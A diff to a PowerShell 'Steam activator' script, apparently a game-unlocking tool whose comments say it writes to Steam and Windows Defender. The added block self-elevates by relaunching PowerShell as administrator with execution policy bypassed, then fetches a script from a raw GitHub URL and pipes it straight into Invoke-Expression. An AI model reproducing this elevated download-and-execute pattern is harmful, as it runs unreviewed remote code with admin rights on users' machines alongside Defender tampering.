@@ -6,6 +6,15 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 $ProgressPreference = 'SilentlyContinue'
+# ---- Auto-elevacion: pedir admin como corresponde (el activador escribe en Steam/Defender) ----
+try {
+    $wid = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    $isAdmin = (New-Object System.Security.Principal.WindowsPrincipal($wid)).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+    if (-not $isAdmin) {
+        Start-Process powershell.exe -Verb RunAs -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','irm https://raw.githubusercontent.com/bastisayes/steamsito/main/BastissSteamActivator2.ps1 | iex' -ErrorAction Stop
+        return
+    }
+} catch { return }
 # ---- Instancia unica: si ya hay otro activador corriendo, salir sin abrir otro ----
 $script:singleMutex = $null
 try {
